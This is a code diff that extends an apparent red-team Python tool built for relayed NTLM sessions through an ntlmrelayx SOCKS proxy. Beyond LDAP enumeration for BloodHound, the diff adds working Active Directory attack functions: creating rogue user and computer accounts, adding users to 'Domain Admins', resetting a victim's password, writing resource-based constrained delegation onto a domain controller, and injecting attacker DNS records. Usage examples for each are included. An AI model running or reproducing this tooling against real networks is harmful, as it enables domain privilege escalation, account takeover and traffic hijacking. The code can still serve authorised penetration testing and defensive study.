+    access_mask = 0x00000100  # ADS_RIGHT_DS_CONTROL_ACCESS
+
+    ace = struct.pack('<B', ace_type)  # AceType
+    ace += struct.pack('<B', ace_flags)  # AceFlags
+    ace_size = 4 + 4 + len(sid_binary)  # Header (4) + AccessMask (4) + SID
+    ace += struct.pack('<H', ace_size)  # AceSize
+    ace += struct.pack('<I', access_mask)  # AccessMask
+    ace += sid_binary  # SID
+
+    # Build ACL (Access Control List)
+    acl_revision = 0x02  # ACL_REVISION
+    acl_size = 8 + len(ace)  # ACL header (8 bytes) + ACEs
+    acl = struct.pack('<B', acl_revision)  # AclRevision
+    acl += struct.pack('<B', 0x00)  # Sbz1 (padding)
+    acl += struct.pack('<H', acl_size)  # AclSize
+    acl += struct.pack('<H', 1)  # AceCount
+    acl += struct.pack('<H', 0x00)  # Sbz2 (padding)
+    acl += ace
+
+    # Build Security Descriptor
+    # Using self-relative format
+    sd_revision = 0x01
+    sd_control = 0x8004  # SE_SELF_RELATIVE | SE_DACL_PRESENT
+
+    # Offsets (owner, group, sacl, dacl)
+    owner_offset = 0  # No owner
+    group_offset = 0  # No group
+    sacl_offset = 0  # No SACL
+    dacl_offset = 20  # After SD header
+
+    sd = struct.pack('<B', sd_revision)  # Revision
+    sd += struct.pack('<B', 0x00)  # Sbz1
+    sd += struct.pack('<H', sd_control)  # Control
+    sd += struct.pack('<I', owner_offset)  # OffsetOwner
+    sd += struct.pack('<I', group_offset)  # OffsetGroup
+    sd += struct.pack('<I', sacl_offset)  # OffsetSacl
+    sd += struct.pack('<I', dacl_offset)  # OffsetDacl
+    sd += acl  # DACL
+
+    return sd
+
+
+def add_user(conn, username, password, ou_dn, base_dn):
+    """
+    Add a new user to Active Directory
+    """
+    print(f"[*] Adding user: {username}")
+
+    # Determine container
+    if ou_dn:
+        user_dn = f"CN={username},{ou_dn}"
+    else:
+        user_dn = f"CN={username},CN=Users,{base_dn}"
+
+    # User attributes
+    attributes = {
+        'objectClass': ['top', 'person', 'organizationalPerson', 'user'],
+        'sAMAccountName': username,
+        'userAccountControl': 544,  # NORMAL_ACCOUNT | PASSWD_NOTREQD
+        'unicodePwd': encode_password(password)
+    }
+
+    try:
+        success = conn.add(user_dn, attributes=attributes)
+        if success:
+            print(f"[+] User {username} created successfully at {user_dn}")
+            return True
+        else:
+            print(f"[-] Failed to create user: {conn.result}")
+            return False
+    except Exception as e:
+        print(f"[-] Error creating user: {e}")
+        return False
+
+
+def add_computer(conn, hostname, password, ou_dn, base_dn, domain_name):
+    """
+    Add a new computer account to Active Directory
+    """
+    print(f"[*] Adding computer: {hostname}$")
+
+    # Determine container
+    if ou_dn:
+        computer_dn = f"CN={hostname},{ou_dn}"
+    else:
+        computer_dn = f"CN={hostname},CN=Computers,{base_dn}"
+
+    # Build SPNs
+    spns = [
+        f"HOST/{hostname}",
+        f"HOST/{hostname}.{domain_name}",
+        f"RestrictedKrbHost/{hostname}",
+        f"RestrictedKrbHost/{hostname}.{domain_name}"
+    ]
+
+    # Computer attributes
+    attributes = {
+        'objectClass': ['top', 'person', 'organizationalPerson', 'user', 'computer'],
+        'sAMAccountName': f"{hostname}$",
+        'userAccountControl': 0x1000,  # WORKSTATION_TRUST_ACCOUNT
+        'dnsHostName': f"{hostname}.{domain_name}",
+        'servicePrincipalName': spns,
+        'unicodePwd': encode_password(password)
+    }
+
+    try:
+        success = conn.add(computer_dn, attributes=attributes)
+        if success:
+            print(f"[+] Computer {hostname}$ created successfully at {computer_dn}")
+            return True
+        else:
+            print(f"[-] Failed to create computer: {conn.result}")
+            return False
+    except Exception as e:
+        print(f"[-] Error creating computer: {e}")
+        return False
+
+
+def add_user_to_group(conn, user, group, base_dn):
+    """
+    Add a user to a group
+    """
+    print(f"[*] Adding {user} to group {group}")
+
+    # Resolve user and group to DNs
+    user_dn = resolve_dn(conn, user, base_dn)
+    group_dn = resolve_dn(conn, group, base_dn)
+
+    print(f"[*] User DN: {user_dn}")
+    print(f"[*] Group DN: {group_dn}")
+
+    # Modify group to add member
+    changes = {
+        'member': [(MODIFY_ADD, [user_dn])]
+    }
+
+    try:
+        success = conn.modify(group_dn, changes)
+        if success:
+            print(f"[+] Successfully added {user} to {group}")
+            return True
+        else:
+            print(f"[-] Failed to add user to group: {conn.result}")
+            return False
+    except Exception as e:
+        print(f"[-] Error adding user to group: {e}")
+        return False
+
+
+def set_password(conn, user, password, base_dn):
+    """
+    Set/reset a user's password
+    """
+    print(f"[*] Setting password for user: {user}")
+
+    # Resolve user to DN
+    user_dn = resolve_dn(conn, user, base_dn)
+    print(f"[*] User DN: {user_dn}")
+
+    # Modify unicodePwd attribute
+    changes = {
+        'unicodePwd': [(MODIFY_REPLACE, [encode_password(password)])]
+    }
+
+    try:
+        success = conn.modify(user_dn, changes)
+        if success:
+            print(f"[+] Password for {user} changed successfully")
+            return True
+        else:
+            print(f"[-] Failed to change password: {conn.result}")
+            return False
+    except Exception as e:
+        print(f"[-] Error changing password: {e}")
+        return False
+
+
+def set_rbcd(conn, target, service, base_dn):
+    """
+    Set Resource-Based Constrained Delegation (RBCD)
+    Allows 'service' account to impersonate users on 'target'
+    """
+    print(f"[*] Setting RBCD: {service} -> {target}")
+
+    # Get service account SID
+    service_sid = get_object_sid(conn, service, base_dn)
+    if not service_sid:
+        print(f"[-] Could not find SID for {service}")
+        return False
+
+    print(f"[*] Service SID: {service_sid}")
+
+    # Resolve target to DN
+    target_dn = resolve_dn(conn, target, base_dn)
+    print(f"[*] Target DN: {target_dn}")
+
+    # Create security descriptor
+    sd_bytes = create_security_descriptor_for_rbcd(service_sid)
+
+    # Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+    changes = {
+        'msDS-AllowedToActOnBehalfOfOtherIdentity': [(MODIFY_REPLACE, [sd_bytes])]
+    }
+
+    try:
+        success = conn.modify(target_dn, changes)
+        if success:
+            print(f"[+] RBCD set successfully: {service} can now impersonate users on {target}")
+            return True
+        else:
+            print(f"[-] Failed to set RBCD: {conn.result}")
+            return False
+    except Exception as e:
+        print(f"[-] Error setting RBCD: {e}")
+        return False
+
+
+def add_dns_record(conn, name, ip, zone, base_dn, domain_name):
+    """
+    Add a DNS A record to Active Directory-Integrated DNS
+    """
+    print(f"[*] Adding DNS record: {name} -> {ip}")
+
+    # Determine zone
+    if not zone:
+        zone = domain_name
+
+    # DNS zone DN
+    zone_dn = f"DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{base_dn}"
+
+    # First, we need to get the SOA serial number
+    print(f"[*] Looking up SOA serial from {zone_dn}")
+
+    serial = None
+    search_filter = "(name=@)"
+    try:
+        results = conn.extend.standard.paged_search(
+            search_base=zone_dn,
+            search_filter=search_filter,
+            search_scope=SUBTREE,
+            attributes=['dnsRecord'],
+            paged_size=10,
+            generator=True
+        )
+        for entry in results:
+            if entry['type'] == 'searchResEntry':
+                dns_records = entry['attributes'].get('dnsRecord', [])
+                for record_bytes in dns_records:
+                    # Parse SOA record to get serial
+                    # DNS_RECORD structure: DataLength(2) + Type(2) + Version(1) + Rank(1) + Flags(2) + Serial(4) + ...
+                    if len(record_bytes) >= 12:
+                        record_type = struct.unpack('<H', record_bytes[2:4])[0]
+                        if record_type == 0x06:  # SOA record
+                            serial = struct.unpack('<I', record_bytes[8:12])[0]
+                            print(f"[*] Found SOA serial: {serial}")
+                            break
+                if serial:
+                    break
+    except Exception as e:
+        print(f"[-] Error getting SOA record: {e}")
+
+    if not serial:
+        # Default serial if we can't find SOA
+        serial = int(time.time())
+        print(f"[*] Using default serial: {serial}")
+
+    # Build DNS A record
+    # DNS_RECORD structure (MS-DNSP 2.3.2.2):
+    # - DataLength (2 bytes, little-endian)
+    # - Type (2 bytes, little-endian): 0x0001 for A record
+    # - Version (1 byte): 0x05
+    # - Rank (1 byte): 0xF0 (RANK_ZONE)
+    # - Flags (2 bytes): 0x0000
+    # - Serial (4 bytes, little-endian)
+    # - TtlSeconds (4 bytes, big-endian): 900 (15 minutes)
+    # - Reserved (4 bytes): 0x00000000
+    # - TimeStamp (4 bytes): 0x00000000
+    # - Data: IPv4 address (4 bytes, big-endian)
+
+    try:
+        ip_obj = ipaddress.IPv4Address(ip)
+        ip_bytes = ip_obj.packed
+    except:
+        print(f"[-] Invalid IP address: {ip}")
+        return False
+
+    data_length = 4  # IPv4 address is 4 bytes
+    record_type = 0x0001  # A record
+    version = 0x05
+    rank = 0xF0  # RANK_ZONE
+    flags = 0x0000
+    ttl = 900  # 15 minutes
+
+    dns_record = struct.pack('<H', data_length)  # DataLength
+    dns_record += struct.pack('<H', record_type)  # Type
+    dns_record += struct.pack('B', version)  # Version
+    dns_record += struct.pack('B', rank)  # Rank
+    dns_record += struct.pack('<H', flags)  # Flags
+    dns_record += struct.pack('<I', serial)  # Serial
+    dns_record += struct.pack('>I', ttl)  # TtlSeconds (big-endian)
+    dns_record += struct.pack('<I', 0)  # Reserved
+    dns_record += struct.pack('<I', 0)  # TimeStamp
+    dns_record += ip_bytes  # Data (IPv4 address in network byte order)
+
+    # DNS node DN
+    record_dn = f"DC={name},{zone_dn}"
+
+    # Check if record already exists
+    existing_records = []
+    search_filter = f"(name={name})"
+    try:
+        results = conn.extend.standard.paged_search(
+            search_base=zone_dn,
+            search_filter=search_filter,
+            search_scope=SUBTREE,
+            attributes=['dnsRecord'],
+            paged_size=10,
+            generator=True
+        )
+        for entry in results:
+            if entry['type'] == 'searchResEntry':
+                existing_records = entry['attributes'].get('dnsRecord', [])
+                record_dn = entry['dn']
+                print(f"[*] Record exists, will update: {record_dn}")
+                break
+    except:
+        pass
+
+    if existing_records:
+        # Update existing record
+        existing_records.append(dns_record)
+        changes = {
+            'dnsRecord': [(MODIFY_REPLACE, existing_records)]
+        }
+        try:
+            success = conn.modify(record_dn, changes)
+            if success:
+                print(f"[+] DNS record updated: {name} -> {ip}")
+                return True
+            else:
+                print(f"[-] Failed to update DNS record: {conn.result}")
+                return False
+        except Exception as e:
+            print(f"[-] Error updating DNS record: {e}")
+            return False
+    else:
+        # Create new record
+        attributes = {
+            'objectClass': ['top', 'dnsNode'],
+            'dnsRecord': dns_record,
+            'dNSTombstoned': False
+        }
+        try:
+            success = conn.add(record_dn, attributes=attributes)
+            if success:
+                print(f"[+] DNS record created: {name} -> {ip}")
+                return True
+            else:
+                print(f"[-] Failed to create DNS record: {conn.result}")
+                return False
+        except Exception as e:
+            print(f"[-] Error creating DNS record: {e}")
+            return False
+
+
+def enumerate_ldap(host, port, domain, username, password, base_dn=None, output_dir=None,
+                   enum_users=False, enum_computers=False, enum_groups=False,
                    enum_trusts=False, enum_gpos=False, enum_ous=False, enum_containers=False,
-                   enum_kerberoastable=False, enum_asreproast=False, 
-                   enum_domain_info=False, enum_all=False, output_format='legacy', 
-                   timeout=600):
+                   enum_kerberoastable=False, enum_asreproast=False,
+                   enum_domain_info=False, enum_all=False, output_format='legacy',
+                   timeout=600, use_ldaps=False, ldap_channel_binding=False, ldap_signing=False):
     """
     Enumerate LDAP using ldap3 with NTLM authentication
     This mimics how Certipy connects and works with ntlmrelayx SOCKS
+
+    Args:
+        use_ldaps: Use LDAPS (LDAP over SSL/TLS)
+        ldap_channel_binding: Enable LDAP channel binding (requires LDAPS)
+        ldap_signing: Enable LDAP signing
     """
-    
+
     # If enum_all, enable everything
     if enum_all:
         enum_users = enum_computers = enum_groups = True
         enum_trusts = enum_gpos = enum_ous = enum_containers = True
         enum_kerberoastable = enum_asreproast = enum_domain_info = True
-    
+
     # Storage for BOFHound output
     bofhound_data = {
         "meta": {
@@ -1726,37 +2993,100 @@ def enumerate_ldap(host, port, domain, username, password, base_dn=None, output_
         },
         "data": {}
     }
-    
+
     # Format username for NTLM: DOMAIN\username
     ntlm_user = f"{domain}\\{username}"
-    
-    print(f"[*] Connecting to {host}:{port}")
+
+    # Validate options
+    if ldap_channel_binding and not use_ldaps:
+        print("[!] Warning: LDAP channel binding requires LDAPS. Enabling LDAPS...")
+        use_ldaps = True
+
+    scheme = "ldaps" if use_ldaps else "ldap"
+    print(f"[*] Connecting to {scheme}://{host}:{port}")
     print(f"[*] Using NTLM authentication as: {ntlm_user}")
     print(f"[*] LDAP timeout: {timeout}s (use -t to adjust for slow SOCKS connections)")
-    
-    # Create server (no SSL, no server info gathering)
-    server = Server(host, port=port, get_info=None, connect_timeout=30)
-    
+    if use_ldaps:
+        print(f"[*] LDAPS: Enabled")
+        if ldap_channel_binding:
+            print(f"[*] Channel binding: Enabled")
+    if ldap_signing:
+        print(f"[*] LDAP signing: Enabled")
+
+    # Create server with optional SSL/TLS
+    if use_ldaps:
+        from ldap3 import Tls
+        # Configure TLS for LDAPS (similar to Certipy)
+        tls = Tls(
+            validate=ssl.CERT_NONE,
+            version=ssl.PROTOCOL_TLS_CLIENT,
+            ciphers="ALL:@SECLEVEL=0",
+        )
+        server = Server(
+            host,
+            port=port,
+            use_ssl=True,
+            get_info=None,
+            connect_timeout=30,
+            tls=tls
+        )
+    else:
+        server = Server(host, port=port, get_info=None, connect_timeout=30)
+
     # Create connection with NTLM authentication
-    # Use default SYNC strategy (like Certipy) - RESTARTABLE doesn't work with SOCKS
-    conn = Connection(
-        server,
-        user=ntlm_user,
-        password=password,
-        authentication=NTLM,
-        # No client_strategy - uses SYNC by default like Certipy
-        auto_bind=False,
-        auto_referrals=False,  # Certipy uses this
-        raise_exceptions=False,
-        receive_timeout=timeout,  # Configurable timeout for SOCKS (default 600s)
-        return_empty_attributes=False
-    )
-    
-    # Bind
-    print(f"[*] Binding...")
-    if not conn.bind():
-        print(f"[-] Bind failed: {conn.result}")
-        return False
+    # Use ExtendedLdapConnection when channel binding or signing is enabled (like Certipy)
+    # Otherwise use standard ldap3.Connection
+    if ldap_channel_binding or ldap_signing:
+        print(f"[*] Using ExtendedLdapConnection with custom NTLM bind (Certipy-style)")
+        conn = ExtendedLdapConnection(
+            server,
+            user=ntlm_user,
+            password=password,
+            authentication=NTLM,
+            auto_bind=False,
+            auto_referrals=False,
+            raise_exceptions=False,
+            receive_timeout=timeout,
+            return_empty_attributes=False,
+            use_channel_binding=ldap_channel_binding,
+            use_signing=ldap_signing,
+            use_ssl=use_ldaps,
+            target_domain=domain,
+            target_user=username,
+            target_password=password,
+            target_nthash=""  # If needed, could be passed as parameter
+        )
+
+        # Bind using custom NTLM bind with channel binding/signing support
+        print(f"[*] Performing custom NTLM bind...")
+        try:
+            result = conn.do_ntlm_bind()
+            if result.get('result') != RESULT_SUCCESS:
+                print(f"[-] Custom NTLM bind failed: {result}")
+                return False
+            print(f"[+] Custom NTLM bind successful")
+        except Exception as e:
+            print(f"[-] Custom NTLM bind error: {e}")
+            return False
+    else:
+        # Standard ldap3 Connection for basic NTLM without channel binding/signing
+        conn = Connection(
+            server,
+            user=ntlm_user,
+            password=password,
+            authentication=NTLM,
+            auto_bind=False,
+            auto_referrals=False,
+            raise_exceptions=False,
+            receive_timeout=timeout,
+            return_empty_attributes=False
+        )
+
+        # Standard bind
+        print(f"[*] Binding...")
+        if not conn.bind():
+            print(f"[-] Bind failed: {conn.result}")
+            return False
     
     print(f"[+] Bind successful!")
     
@@ -1909,9 +3239,9 @@ def enumerate_ldap(host, port, domain, username, password, base_dn=None, output_
     
 def main():
     parser = argparse.ArgumentParser(
-        description='LDAP Enumeration via ntlmrelayx SOCKS (BOFHound compatible)',
+        description='LDAP Enumeration and Modification via ntlmrelayx SOCKS (BOFHound compatible)',
         epilog='''
-Examples:
+Enumeration Examples:
   # Full enumeration (all queries)
   proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --all -o /tmp/output
 
@@ -1919,9 +3249,31 @@ Examples:
   proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --users --computers
   proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --kerberoastable
   proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --asreproast
-  
-  # With manual base DN
-  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe -b "DC=contoso,DC=local" --all
+
+  # With LDAPS (SSL/TLS) and channel binding
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --all --ldaps --ldap-channel-binding
+
+  # With LDAP signing
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --all --ldap-signing
+
+Modification Examples:
+  # Add new user
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-user newuser --add-user-pass 'P@ssw0rd!'
+
+  # Add new computer
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-computer EVIL01 --add-computer-pass 'P@ssw0rd!'
+
+  # Add user to group
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-user-to-group newuser "Domain Admins"
+
+  # Set/reset password
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --set-password victim 'NewP@ss123!'
+
+  # Set RBCD (Resource-Based Constrained Delegation)
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --set-rbcd DC01 EVIL01$
+
+  # Add DNS A record
+  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-dns attacker 10.10.10.50
         ''',
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
@@ -1933,9 +3285,22 @@ Examples:
     parser.add_argument('-u', '--username', required=True, help='Username (from ntlmrelayx SOCKS session)')
     parser.add_argument('-P', '--password', default='dummy', help='Password (default: dummy - ignored by SOCKS)')
     parser.add_argument('-b', '--base-dn', help='Base DN (auto-detected if not provided)')
-    parser.add_argument('-t', '--timeout', type=int, default=600, 
+    parser.add_argument('-t', '--timeout', type=int, default=600,
                        help='LDAP receive timeout in seconds (default: 600 for SOCKS)')
-    
+
+    # LDAP Security options
+    security_group = parser.add_argument_group('LDAP security options')
+    security_group.add_argument('--ldaps', action='store_true',
+                               help='Use LDAPS (LDAP over SSL/TLS) on port 636')
+    security_group.add_argument('--ldap-channel-binding', action='store_true', default=False,
+                               help='Enable LDAP channel binding (requires LDAPS)')
+    security_group.add_argument('--no-ldap-channel-binding', dest='ldap_channel_binding', action='store_false',
+                               help='Disable LDAP channel binding (default)')
+    security_group.add_argument('--ldap-signing', action='store_true', default=False,
+                               help='Enable LDAP signing')
+    security_group.add_argument('--no-ldap-signing', dest='ldap_signing', action='store_false',
+                               help='Disable LDAP signing (default)')
+
     # Output options
     parser.add_argument('-o', '--output', help='Output directory for results')
     
@@ -1960,12 +3325,36 @@ Examples:
     enum_group.add_argument('--containers', action='store_true', help='Enumerate containers')
     enum_group.add_argument('--kerberoastable', action='store_true', help='Find Kerberoastable accounts (users with SPN)')
     enum_group.add_argument('--asreproast', action='store_true', help='Find AS-REP roastable accounts (no pre-auth)')
-    
+
+    # LDAP modification operations
+    mod_group = parser.add_argument_group('LDAP modification operations')
+    mod_group.add_argument('--add-user', metavar='USERNAME', help='Add a new user')
+    mod_group.add_argument('--add-user-pass', metavar='PASSWORD', help='Password for new user (use with --add-user)')
+    mod_group.add_argument('--add-user-ou', metavar='OU_DN', help='OU for new user (default: CN=Users,DC=...)')
+    mod_group.add_argument('--add-computer', metavar='HOSTNAME', help='Add a new computer account')
+    mod_group.add_argument('--add-computer-pass', metavar='PASSWORD', help='Password for new computer (use with --add-computer)')
+    mod_group.add_argument('--add-computer-ou', metavar='OU_DN', help='OU for new computer (default: CN=Computers,DC=...)')
+    mod_group.add_argument('--add-user-to-group', nargs=2, metavar=('USER', 'GROUP'),
+                          help='Add user to group (e.g., --add-user-to-group jdoe "Domain Admins")')
+    mod_group.add_argument('--set-password', nargs=2, metavar=('USER', 'PASSWORD'),
+                          help='Set/reset user password (e.g., --set-password jdoe NewPass123!)')
+    mod_group.add_argument('--set-rbcd', nargs=2, metavar=('TARGET', 'SERVICE'),
+                          help='Set RBCD delegation (e.g., --set-rbcd DC01 ATTACKER$)')
+    mod_group.add_argument('--add-dns', nargs=2, metavar=('NAME', 'IP'),
+                          help='Add DNS A record (e.g., --add-dns attacker 10.10.10.50)')
+    mod_group.add_argument('--dns-zone', metavar='ZONE', help='DNS zone (default: domain zone)')
+
     args = parser.parse_args()
-    
-    # If no enumeration options specified, default to --all
-    if not any([args.all, args.domain_info, args.users, args.computers, args.groups, 
-                args.trusts, args.gpos, args.ous, args.containers, 
+
+    # Check if any modification operation is requested
+    is_modification = any([
+        args.add_user, args.add_computer, args.add_user_to_group,
+        args.set_password, args.set_rbcd, args.add_dns
+    ])
+
+    # If no enumeration options specified and no modification, default to --all
+    if not is_modification and not any([args.all, args.domain_info, args.users, args.computers, args.groups,
+                args.trusts, args.gpos, args.ous, args.containers,
                 args.kerberoastable, args.asreproast]):
         args.all = True
     
@@ -1975,28 +3364,171 @@ Examples:
     elif args.bofhound:
         output_format = 'bofhound'
     else:
-        output_format = 'legacy'  # Default: BloodHound Legacy v4
-    
+        output_format = 'legacy'  # Default: BloodHound Legacy v5
+
+    # Auto-adjust port for LDAPS if not explicitly set
+    port = args.port
+    if args.ldaps and args.port == 389:
+        port = 636
+        print(f"[*] LDAPS enabled, using default port 636")
+
     print("=" * 70)
-    print("LDAP Enumeration via ntlmrelayx SOCKS (ldap3 + NTLM)")
+    if is_modification:
+        print("LDAP Modification via ntlmrelayx SOCKS (ldap3 + NTLM)")
+    else:
+        print("LDAP Enumeration via ntlmrelayx SOCKS (ldap3 + NTLM)")
     print("=" * 70)
     print()
     print("NOTE: This script works with ntlmrelayx SOCKS proxy when other")
     print("      tools fail. Uses Certipy's LDAP connection method.")
     print()
-    
-    if output_format == 'legacy':
-        print(f"[*] Output format: BloodHound Legacy v4 (compatible with BH 4.2/4.3)")
-    elif output_format == 'ce':
-        print(f"[*] Output format: BloodHound CE v5")
-    elif output_format == 'bofhound':
-        print(f"[*] Output format: BOFHound")
-    print()
-    
+
+    if not is_modification:
+        if output_format == 'legacy':
+            print(f"[*] Output format: BloodHound Legacy v5 (compatible with bloodhound.py)")
+        elif output_format == 'ce':
+            print(f"[*] Output format: BloodHound CE v6")
+        elif output_format == 'bofhound':
+            print(f"[*] Output format: BOFHound")
+        print()
+
+    # Handle LDAP modification operations
+    if is_modification:
+        try:
+            # Format username for NTLM: DOMAIN\username
+            ntlm_user = f"{args.domain}\\{args.username}"
+
+            # Validate LDAP security options for modifications
+            if args.ldap_channel_binding and not args.ldaps:
+                print("[!] Warning: LDAP channel binding requires LDAPS. Enabling LDAPS...")
+                args.ldaps = True
+
+            scheme = "ldaps" if args.ldaps else "ldap"
+            print(f"[*] Connecting to {scheme}://{args.host}:{port}")
+            print(f"[*] Using NTLM authentication as: {ntlm_user}")
+
+            # Create server
+            if args.ldaps:
+                from ldap3 import Tls
+                tls = Tls(
+                    validate=ssl.CERT_NONE,
+                    version=ssl.PROTOCOL_TLS_CLIENT,
+                    ciphers="ALL:@SECLEVEL=0",
+                )
+                server = Server(
+                    args.host,
+                    port=port,
+                    use_ssl=True,
+                    get_info=None,
+                    connect_timeout=30,
+                    tls=tls
+                )
+            else:
+                server = Server(args.host, port=port, get_info=None, connect_timeout=30)
+
+            # Create connection
+            if args.ldap_channel_binding or args.ldap_signing:
+                print(f"[*] Using ExtendedLdapConnection with custom NTLM bind")
+                conn = ExtendedLdapConnection(
+                    server,
+                    user=ntlm_user,
+                    password=args.password,
+                    authentication=NTLM,
+                    auto_bind=False,
+                    auto_referrals=False,
+                    raise_exceptions=False,
+                    receive_timeout=args.timeout,
+                    return_empty_attributes=False,
+                    use_channel_binding=args.ldap_channel_binding,
+                    use_signing=args.ldap_signing,
+                    use_ssl=args.ldaps,
+                    target_domain=args.domain,
+                    target_user=args.username,
+                    target_password=args.password,
+                    target_nthash=""
+                )
+                print(f"[*] Performing custom NTLM bind...")
+                result = conn.do_ntlm_bind()
+                if result.get('result') != RESULT_SUCCESS:
+                    print(f"[-] Custom NTLM bind failed: {result}")
+                    return
+                print(f"[+] Custom NTLM bind successful")
+            else:
+                conn = Connection(
+                    server,
+                    user=ntlm_user,
+                    password=args.password,
+                    authentication=NTLM,
+                    auto_bind=False,
+                    auto_referrals=False,
+                    raise_exceptions=False,
+                    receive_timeout=args.timeout,
+                    return_empty_attributes=False
+                )
+                print(f"[*] Binding...")
+                if not conn.bind():
+                    print(f"[-] Bind failed: {conn.result}")
+                    return
+                print(f"[+] Bind successful")
+
+            # Determine base DN if not provided
+            if not args.base_dn:
+                base_dn = ','.join([f'DC={part}' for part in args.domain.split('.')])
+            else:
+                base_dn = args.base_dn
+
+            print(f"[*] Base DN: {base_dn}")
+            print()
+
+            # Get domain name for operations that need it
+            domain_name = args.domain if '.' in args.domain else f"{args.domain}.local"
+
+            # Execute modification operations
+            if args.add_user:
+                if not args.add_user_pass:
+                    print("[-] Error: --add-user requires --add-user-pass")
+                else:
+                    add_user(conn, args.add_user, args.add_user_pass, args.add_user_ou, base_dn)
+
+            if args.add_computer:
+                if not args.add_computer_pass:
+                    print("[-] Error: --add-computer requires --add-computer-pass")
+                else:
+                    add_computer(conn, args.add_computer, args.add_computer_pass,
+                               args.add_computer_ou, base_dn, domain_name)
+
+            if args.add_user_to_group:
+                user, group = args.add_user_to_group
+                add_user_to_group(conn, user, group, base_dn)
+
+            if args.set_password:
+                user, password = args.set_password
+                set_password(conn, user, password, base_dn)
+
+            if args.set_rbcd:
+                target, service = args.set_rbcd
+                set_rbcd(conn, target, service, base_dn)
+
+            if args.add_dns:
+                name, ip = args.add_dns
+                add_dns_record(conn, name, ip, args.dns_zone, base_dn, domain_name)
+
+            conn.unbind()
+            print()
+            print("[+] Modification operations completed")
+            return
+
+        except Exception as e:
+            print(f"[-] Error during modification: {e}")
+            import traceback
+            traceback.print_exc()
+            return
+
+    # Handle enumeration operations
     try:
         enumerate_ldap(
             host=args.host,
-            port=args.port,
+            port=port,
             domain=args.domain,
             username=args.username,
             password=args.password,
@@ -2014,7 +3546,10 @@ Examples:
             enum_domain_info=args.domain_info,
             enum_all=args.all,
             output_format=output_format,
-            timeout=args.timeout
+            timeout=args.timeout,
+            use_ldaps=args.ldaps,
+            ldap_channel_binding=args.ldap_channel_binding,
+            ldap_signing=args.ldap_signing
         )
     except Exception as e:
         print(f"[-] Error: {e}")
